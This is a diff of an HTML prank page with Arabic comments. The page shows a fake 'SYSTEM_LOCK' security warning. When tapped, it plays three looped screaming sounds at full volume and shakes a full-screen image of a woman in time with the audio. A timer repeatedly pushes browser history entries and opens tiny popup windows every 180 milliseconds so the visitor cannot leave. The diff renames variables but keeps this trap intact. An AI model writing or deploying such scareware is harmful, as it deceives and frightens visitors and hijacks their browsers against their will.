@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ CRITICAL_HALT ⚠️</title>
+    <title>☠️ SYSTEM_HALT ☠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* صورة المرأة: كبيرة، واضحة، ومهيأة للهبال سواسوة */
+        /* صورة المرأة تعمر الشاشة ومستعدة للهبال سواسوة */
         #ghost { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
             object-fit: cover; z-index: 10; display: none;
@@ -30,73 +30,69 @@
         }
     </style>
 </head>
-<body onclick="igniteTheMadness()">
+<body onclick="launchNightmare()">
 
     <div id="ui">
         <h1 class="blink">☠️ SYSTEM_LOCK ☠️</h1>
-        <p>Access Violation Detected.<br>Tap to force terminate all processes.</p>
+        <p>Illegal Entry Detected.<br>Tap to force terminate all processes.</p>
         <button class="btn">TERMINATE</button>
     </div>
 
     <img id="ghost" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="vault">
-        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
-        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
-        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
+    <div id="sounds">
+        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
+        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
+        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
     </div>
 
     <script>
-        let aCtx, analyser, data;
+        let ctx, analyzer, buffer;
         const img = document.getElementById('ghost');
 
-        function igniteTheMadness() {
-            // 1. تشغيل الأصوات الثلاثة في وقت واحد سواسوة
-            document.querySelectorAll('.track').forEach(t => { 
-                t.volume = 1.0; 
-                t.play(); 
-            });
+        function launchNightmare() {
+            // 1. إطلاق الأصوات الـ 3 الجديدة فوراً سواسوة
+            const audios = document.querySelectorAll('.t');
+            audios.forEach(a => { a.volume = 1.0; a.play(); });
 
             document.getElementById('ui').style.display = 'none';
             img.style.display = 'block';
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // 2. المحرك البصري (الرعشة مع الصوت) سواسوة
-            if (!aCtx) {
-                aCtx = new (window.AudioContext || window.webkitAudioContext)();
-                // نربط الحركة بـ "Chicken Screaming" لأن الـ Peak تاعه عالي سواسوة
-                const source = aCtx.createMediaElementSource(document.querySelectorAll('.track')[1]);
-                analyser = aCtx.createAnalyser();
-                analyser.fftSize = 64;
-                data = new Uint8Array(analyser.frequencyBinCount);
-                source.connect(analyser);
-                analyser.connect(aCtx.destination);
+            // 2. تفعيل محرك التخبيط البصري سواسوة
+            if (!ctx) {
+                ctx = new (window.AudioContext || window.webkitAudioContext)();
+                // نربط الحركة بصرخة الدجاجة و Dzonza سواسوة
+                const src = ctx.createMediaElementSource(audios[1]); 
+                analyzer = ctx.createAnalyser();
+                analyzer.fftSize = 64;
+                buffer = new Uint8Array(analyzer.frequencyBinCount);
+                src.connect(analyzer);
+                analyzer.connect(ctx.destination);
                 
-                if (aCtx.state === 'suspended') aCtx.resume();
-                renderLoop();
+                if (ctx.state === 'suspended') ctx.resume();
+                jitterAnimation();
             }
 
-            // 3. نظام الحبس (منع الخروج) سواسوة
+            // 3. منع الهروب سواسوة
             setInterval(() => {
                 history.pushState(null, null, window.location.href);
                 window.open(window.location.href, '_blank', 'width=10,height=10');
             }, 180);
         }
 
-        function renderLoop() {
-            analyser.getByteFrequencyData(data);
-            let vol = data[0]; // التفاعل مع صرخة الدجاجة سواسوة
+        function jitterAnimation() {
+            analyzer.getByteFrequencyData(buffer);
+            let vol = buffer[0]; 
 
-            // 4. ميزة التخبيط (Jitter): اهتزاز هستيري سواسوة
-            const power = (vol / 255) * 85; 
-            const x = (Math.random() - 0.5) * power * 5;
-            const y = (Math.random() - 0.5) * power * 5;
+            // 4. ميزة التخبيط: المرأة ترعش وتتخبط بقوة سواسوة
+            const power = (vol / 255) * 80; 
+            const x = (Math.random() - 0.5) * power * 6;
+            const y = (Math.random() - 0.5) * power * 6;
             const r = (Math.random() - 0.5) * power;
-            const s = 1 + (vol / 255) * 0.6; // التكبير العنيف
+            const s = 1 + (vol / 255) * 0.55;
 
             img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
-            
-            requestAnimationFrame(renderLoop);
+            requestAnimationFrame(jitterAnimation);
         }
     </script>
 </body>
